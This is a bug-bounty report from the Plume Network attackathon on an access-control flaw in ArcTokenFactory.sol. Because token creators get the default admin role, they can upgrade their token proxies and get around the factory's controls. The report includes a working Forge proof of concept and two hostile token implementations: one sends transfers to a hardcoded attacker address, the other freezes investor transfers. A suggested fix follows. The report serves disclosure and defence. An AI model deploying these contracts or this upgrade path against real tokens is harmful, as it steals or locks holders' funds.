# 50916 sc high token creators can bypass factory upgrade controls via wrong code implementation of default admin role in arctokenfactory sol&#x20;

**Submitted on Jul 29th 2025 at 17:17:21 UTC by @demonhat for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #50916
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcTokenFactory.sol>
* **Impacts:** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

***

## Description

### Brief / Intro

In the ArcTokenFactory.sol contract, the `createToken()` implementation grants `DEFAULT_ADMIN_ROLE` to the token creator (the `msg.sender` of `createToken`) instead of keeping the factory as the default admin. That is:

```solidity
// Grant all necessary roles to the owner
// Grant the DEFAULT_ADMIN_ROLE to the deployer <--------
token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender); //issue! not following the comment, this grants the highest role to the Token creator!
token.grantRole(token.ADMIN_ROLE(), msg.sender);
token.grantRole(token.MANAGER_ROLE(), msg.sender);
token.grantRole(token.YIELD_MANAGER_ROLE(), msg.sender);
token.grantRole(token.YIELD_DISTRIBUTOR_ROLE(), msg.sender);
token.grantRole(token.MINTER_ROLE(), msg.sender);
token.grantRole(token.BURNER_ROLE(), msg.sender);
token.grantRole(token.UPGRADER_ROLE(), address(this));
```

Because `DEFAULT_ADMIN_ROLE` is the highest privileged role in an AccessControl setup, token creators who receive it can grant themselves any other role (including `UPGRADER_ROLE`) and then call upgrade functions on the token proxy directly to replace the implementation with malicious code. This completely bypasses the factory's intended upgrade controls (which are supposed to be enforced by the factory's own `upgradeToken()` function).

### High-level impact

* Token creators can grant themselves `UPGRADER_ROLE` and call the proxy's `upgradeToAndCall()` to replace the implementation with malicious implementations that steal funds or freeze transfers.
* The factory's `upgradeToken()` security checks (only callable by factory admins, whitelist checks, tracking) are bypassed by direct proxy upgrades from the token creator.
* Once malicious implementation is installed, factory admins cannot recover control; funds are at risk permanently for the affected token(s).

***

## Vulnerability Details

* Root cause: Excessive (and incorrect) role granting — granting `DEFAULT_ADMIN_ROLE` to token creators during creation rather than to the factory itself.
* Example problematic line (ArcTokenFactory.sol):

  ```solidity
  // Grant the DEFAULT_ADMIN_ROLE to the deployer
  token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender); // <-- wrong
  ```
* Bypass mechanism:
  * Creator grants self `UPGRADER_ROLE` (because they hold `DEFAULT_ADMIN_ROLE`).
  * Creator calls proxy upgrade directly:

    ```solidity
    token.upgradeToAndCall(address(maliciousImpl), "");
    ```
  * This replaces proxy implementation with malicious code (examples below) that can steal transfers or freeze user transfers while allowing attacker to bypass restrictions.
* Malicious implementation technique:
  * Implementations can hardcode an attacker address so they don't rely on preserved storage layout when used as an implementation, e.g.:

    ```solidity
    contract MaliciousArcToken is ArcToken {
        address public constant attacker = 0xAc5cb37b...;

        function transfer(address to, uint256 amount) public override returns (bool) {
            _transfer(msg.sender, attacker, amount);
            return true;
        }
    }
    ```
  * Hardcoded attacker addresses and overriding core logic leads to reliable theft even when storage/layout differs.

***

## Complete Factory Invariant Bypass

Factory intended invariants:

* Only factory admins can upgrade tokens.
* Only whitelisted implementations can be used.
* Factory maintains control over token upgrades.

Attack breaks all invariants:

* Creator can upgrade without factory permission.
* Malicious implementations bypass whitelist checks.
* Factory loses authoritative control and tracking of final implementation.

***

## Impact Details

* Direct Fund Theft: demonstrated in PoC below — transfers redirected to attacker.
* Permanent Control: malicious creator retains upgrade ability and can deploy multiple malicious implementations.
* Multiple attack vectors: complete theft, transfer freeze, overriding factory upgrades.
* Recovery: impossible for factory admins once malicious implementation is installed.
* Scope: all tokens created by malicious creators via this factory pattern.
* Estimated loss potential: potentially total TVL of tokens created by malicious creators (e.g., $1M TVL could be fully stolen).

***

## References

* ArcTokenFactory.sol: lines granting `DEFAULT_ADMIN_ROLE` to creator (approx lines 192-193 in referenced file).
* ArcTokenFactory.sol: `upgradeToken` function (approx lines 260-285) showing factory-side checks that are bypassable by direct upgrades.

***

## Proof of Concept

Below is the POC test (Forge-style) submitted. It demonstrates creation of a token by a malicious creator, the granting of upgrade privileges, direct upgrade to malicious implementations, and theft/freeze behaviors.

Do not modify — original PoC code preserved:

```solidity
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { ArcToken } from "../src/ArcToken.sol";
import { ArcTokenFactory } from "../src/ArcTokenFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Strings } from "@openzeppelin/contracts/utils/Strings.sol";
import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";

// Import necessary restriction contracts and interfaces
import { RestrictionsRouter } from "../src/restrictions/RestrictionsRouter.sol";
import { WhitelistRestrictions } from "../src/restrictions/WhitelistRestrictions.sol";
import { IAccessControl } from "@openzeppelin/contracts/access/IAccessControl.sol";
import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ArcTokenFactoryTest is Test {

    ArcTokenFactory public factory;
    RestrictionsRouter public router;
    ERC20Mock public yieldToken;

    address public admin;
    address public deployer;
    address public user;

    event TokenCreated(
        address indexed tokenAddress,
        address indexed owner,
        address indexed implementation,
        string name,
        string symbol,
        string tokenUri,
        uint8 decimals
    );
    event ImplementationWhitelisted(address indexed implementation);
    event ImplementationRemoved(address indexed implementation);

    // Define module type constants matching ArcToken/Factory
    bytes32 public constant TRANSFER_RESTRICTION_TYPE = keccak256("TRANSFER_RESTRICTION");
    bytes32 public constant YIELD_RESTRICTION_TYPE = keccak256("YIELD_RESTRICTION");

    function setUp() public {
        admin = address(this);
        deployer = makeAddr("deployer");
        user = makeAddr("user");

        // Deploy mock yield token
        yieldToken = new ERC20Mock();

        // Deploy Router
        router = new RestrictionsRouter();
        router.initialize(admin); // Initialize router with admin

        // Deploy factory
        factory = new ArcTokenFactory();
        factory.initialize(address(router)); // Initialize factory with router address
    }

   /**
     * @dev POC demonstrating critical vulnerability where token creators can bypass factory upgrade controls
     * @notice This test shows how token creators can upgrade their tokens directly, bypassing all factory security
     * @dev Impact: Complete system compromise - token creators have ultimate control over their tokens
     */
    function test_POC_TokenCreatorUpgradeBypass() public {
        // Step 1: Create a token as a malicious creator
        address maliciousCreator = makeAddr("maliciousCreator");
        vm.startPrank(maliciousCreator);
        
        address tokenAddress = factory.createToken(
            "Legitimate Token",
            "LEGIT",
            1000e18,
            address(yieldToken),
            "ipfs://legitimate-uri",
            maliciousCreator,
            18
        );
        ArcToken token = ArcToken(tokenAddress);
        vm.stopPrank();

        // Step 2: Verify token creator has DEFAULT_ADMIN_ROLE (which can grant any role)
        assertTrue(token.hasRole(token.DEFAULT_ADMIN_ROLE(), maliciousCreator), "Creator should have DEFAULT_ADMIN_ROLE");
        assertTrue(token.hasRole(token.ADMIN_ROLE(), maliciousCreator), "Creator should have ADMIN_ROLE");
        assertTrue(token.hasRole(token.MINTER_ROLE(), maliciousCreator), "Creator should have MINTER_ROLE");
        assertTrue(token.hasRole(token.BURNER_ROLE(), maliciousCreator), "Creator should have BURNER_ROLE");

        // Step 3: Verify factory has UPGRADER_ROLE (but this can be bypassed)
        assertTrue(token.hasRole(token.UPGRADER_ROLE(), address(factory)), "Factory should have UPGRADER_ROLE");

        // Step 4: Simulate investors buying tokens
        address investor1 = makeAddr("investor1");
        address investor2 = makeAddr("investor2");
        
        vm.startPrank(maliciousCreator);
        token.transfer(investor1, 100e18);
        token.transfer(investor2, 100e18);
        vm.stopPrank();

        assertEq(token.balanceOf(investor1), 100e18, "Investor1 should have 100 tokens");
        assertEq(token.balanceOf(investor2), 100e18, "Investor2 should have 100 tokens");

        // Step 5: Malicious creator grants themselves UPGRADER_ROLE
        vm.startPrank(maliciousCreator);
        token.grantRole(token.UPGRADER_ROLE(), maliciousCreator);
        assertTrue(token.hasRole(token.UPGRADER_ROLE(), maliciousCreator), "Creator should now have UPGRADER_ROLE");
        vm.stopPrank();

        // Step 6: Deploy malicious implementation (Attack 1: Complete Token Theft)
        MaliciousArcToken maliciousImpl = new MaliciousArcToken();

        // Step 7: Malicious creator upgrades token directly, bypassing factory controls
        vm.startPrank(maliciousCreator);
        token.upgradeToAndCall(address(maliciousImpl), "");
        vm.stopPrank();

        // Step 8: Verify upgrade was successful by checking proxy storage directly
        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address currentImpl = address(uint160(uint256(vm.load(tokenAddress, implementationSlot))));
        assertEq(currentImpl, address(maliciousImpl), "Token should be upgraded to malicious implementation");

        // Step 9: Demonstrate Attack 1 - Complete Token Theft
        // Investor1 tries to transfer tokens to investor2
        vm.startPrank(investor1);
        token.transfer(investor2, 50e18);
        vm.stopPrank();

        // Check that tokens were stolen instead of transferred
        assertEq(token.balanceOf(investor1), 50e18, "Investor1 should have 50 tokens left");
        assertEq(token.balanceOf(investor2), 100e18, "Investor2 should still have 100 tokens (no transfer)");
        assertEq(token.balanceOf(maliciousCreator), 850e18, "Malicious creator should have stolen 50 tokens");

        // Step 10: Deploy second malicious implementation (Attack 2: Transfer Freeze)
        FreezeArcToken freezeImpl = new FreezeArcToken();

        // Step 11: Upgrade again to freeze implementation
        vm.startPrank(maliciousCreator);
        token.grantRole(token.UPGRADER_ROLE(), maliciousCreator); // Ensure still has role
        token.upgradeToAndCall(address(freezeImpl), "");
        vm.stopPrank();

        // Step 12: Demonstrate Attack 2 - Transfer Freeze
        // Investor1 tries to transfer tokens (should fail)
        vm.startPrank(investor1);
        vm.expectRevert("Transfers frozen");
        token.transfer(investor2, 10e18);
        vm.stopPrank();

        // Malicious creator can still transfer (bypass freeze)
        vm.startPrank(maliciousCreator);
        token.transfer(investor1, 10e18); // This works because from == maliciousCreator
        vm.stopPrank();

        // Verify freeze worked for investors but not creator
        assertEq(token.balanceOf(investor1), 60e18, "Investor1 should have received 10 tokens from creator");
        assertEq(token.balanceOf(investor2), 100e18, "Investor2 should still have 100 tokens");

        // Step 13: Demonstrate that factory upgrade controls are completely bypassed
        // Factory admin cannot control this token anymore
        address legitimateImpl = address(new ArcToken());
        factory.whitelistImplementation(legitimateImpl);
        
        // Factory admin tries to upgrade (this would work if creator hadn't bypassed)
        factory.upgradeToken(tokenAddress, legitimateImpl);
        
        // But malicious creator can still upgrade again, overriding factory
        vm.startPrank(maliciousCreator);
        token.grantRole(token.UPGRADER_ROLE(), maliciousCreator);
        token.upgradeToAndCall(address(maliciousImpl), "");
        vm.stopPrank();

        // Verify malicious creator still controls the token
        address finalImpl = address(uint160(uint256(vm.load(tokenAddress, implementationSlot))));
        assertEq(finalImpl, address(maliciousImpl), "Malicious creator still controls the token");
    }
}

/**
 * @dev Malicious implementation that steals all transfers
 */
contract MaliciousArcToken is ArcToken {
    // Hardcode the attacker address since storage won't be preserved when used as proxy implementation
    address public constant attacker = 0xAc5cb37bDBAf812F79a248d67FA6f5bB33fBbC1B;

    function transfer(address to, uint256 amount) public override returns (bool) {
        // Instead of transferring to 'to', transfer to attacker
        _transfer(msg.sender, attacker, amount);
        return true;
    }

    function _update(address from, address to, uint256 amount) internal override {
        // Bypass all transfer restrictions and steal tokens
        if (from != address(0) && to != address(0)) {
            // Steal the transfer by calling the parent's _update with attacker as recipient
            super._update(from, attacker, amount);
        } else {
            // Allow minting/burning
            super._update(from, to, amount);
        }
    }
}

/**
 * @dev Malicious implementation that freezes all transfers except from attacker
 */
contract FreezeArcToken is ArcToken {
    // Hardcode the attacker address since storage won't be preserved when used as proxy implementation
    address public constant attacker = 0xAc5cb37bDBAf812F79a248d67FA6f5bB33fBbC1B;

    function _update(address from, address to, uint256 amount) internal override {
        // Block all transfers except from attacker
        if (from != address(0) && from != attacker) {
            revert("Transfers frozen");
        }
        super._update(from, to, amount);
    }
}
```

***

## FIX

Correct behavior: grant `DEFAULT_ADMIN_ROLE` to the factory contract (so the factory retains the highest privilege) and keep `UPGRADER_ROLE` and other operational roles consistent with factory control.

Suggested minimal code change in ArcTokenFactory.sol:

```diff
- // Grant the DEFAULT_ADMIN_ROLE to the deployer
- token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender); // WRONG
+ // Grant the DEFAULT_ADMIN_ROLE to the factory (for upgradeToken access)
+ token.grantRole(token.DEFAULT_ADMIN_ROLE(), address(this)); // FIXED!

token.grantRole(token.ADMIN_ROLE(), msg.sender);
token.grantRole(token.MANAGER_ROLE(), msg.sender);
// ... other roles for token creator ...
token.grantRole(token.UPGRADER_ROLE(), address(this));
```

{% hint style="success" %}
Ensure the factory is the `DEFAULT_ADMIN_ROLE`. Only grant the token creator the operational roles they require (e.g., MINTER, BURNER, MANAGER) but not the default admin role. Also review any other role-granting calls for similar privilege elevation.
{% endhint %}

***

If you want, I can:

* create a minimal patch/PR diff for ArcTokenFactory.sol showing the exact change(s) and locations, or
* statically analyze ArcTokenFactory.sol to confirm the exact line numbers and produce a suggested commit.
